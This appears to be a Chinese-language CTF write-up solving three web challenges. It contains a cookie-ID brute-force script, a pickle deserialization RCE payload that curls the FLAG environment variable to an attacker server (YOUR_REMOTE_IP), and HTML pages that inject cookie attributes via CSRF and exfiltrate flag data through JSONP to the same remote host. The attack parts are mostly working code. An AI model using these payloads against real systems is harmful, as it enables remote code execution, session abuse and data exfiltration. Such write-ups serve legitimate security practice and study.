# 1 Jiaran!!!
用给出的用户名登录后，爆破cookie的id即可
```python
import requests

for i in range(0, 1000):
    r = requests.get("http://103.102.44.218:10003/", headers={
        "Cookie": f"userData=j%3A%7B%22userID%22%3A%22{str(i).rjust(3, '0')}%22%2C%22username%22%3A%22admin%22%7D"
    })
    if "flag{" in r.text:
        print(r.text)
```
运行脚本等一会可以得到flag，等不及的可以开多线程玩

# 2 Do you like pickle?
pickle反序列化RCE，没有过滤(一般题目可能过滤掉R指令)，直接打印环境变量到远程服务器：
```python
import base64
import pickle


class RCE(object):
    def __reduce__(self):
        s = "__import__('os').popen('curl http://YOUR_REMOTE_IP/$FLAG').read()"
        return eval, (s,)  # reduce函数必须返回元组或字符串


print(base64.b64encode(pickle.dumps(RCE())))
```
执行后查看远程服务器的日志
>tail /var/log/apache2/access.log

得到flag

# 3 Jason is a cool guy

## 特殊解：
密码是然然的直播间号，真正的嘉心糖可以直接输入正确的密码得到flag。

## 预期解：

在服务器端更新cookie的逻辑有漏洞：
```js
app.post('/passcode', function (req, res) {
	if (req.body.passcode === 'CLEAR') res.append('Set-Cookie', 'passcode=')
	else res.append('Set-Cookie', `passcode=${(req.cookies.passcode || '')+req.body.passcode}`)
	return res.redirect('/')
})
```
可以通过第三方页面向 **/passcode** 提交
>; Secure; SameSite=None

来增加Admin Bot的cookie属性，指定 **SameStie=None** 可以让cookie可以跨站发送造成CSRF。  
注意该属性仅适用于https访问传递cookie（指定 **SameStie=None** 需要cookie带有 **Secure** 属性，而Cookie:Secure仅适用于https）  
之后在空referer（绕过samesite函数检测）情况下再加载flag页面就能拿到flag
```html
<!--1.html-->
<html>
    <head>
        <meta name="referrer" content="no-referrer">
    </head>
    <body>
        <script>
                function load (data) {
                    var x = data.items.map(i => ` ${i} `).join('')
                    var y = btoa(x)
                    window.open("http://YOUR_REMOTE_IP/="+y);
                }
                window.open("./2.html");
        </script>
        <script src="https://81.68.223.245/flags?callback=load"></script>
        <script src="https://81.68.223.245/languages?callback=load"></script>
        <script src="https://81.68.223.245/friends?callback=load"></script>
        <script src="https://81.68.223.245/flags?callback=load"></script>
        <script src="https://81.68.223.245/flags?callback=load"></script>
        <script src="https://81.68.223.245/flags?callback=load"></script>
        <script src="https://81.68.223.245/flags?callback=load"></script>
        <script src="https://81.68.223.245/flags?callback=load"></script>
    </body>
</html>
```

```html
<!--2.html-->
<html lang="en">
<head>
    <meta name="referrer" content="no-referrer">
</head>
<body>
    <form action="https://81.68.223.245/passcode" id="csrf-form" method="POST">
        <input name="passcode" value="; Secure; SameSite=None">
    </form>
    <script>document.getElementById("csrf-form").submit()</script>
</body>
</html>
```
输入1.html的link后查看远程服务器的日志，得到flag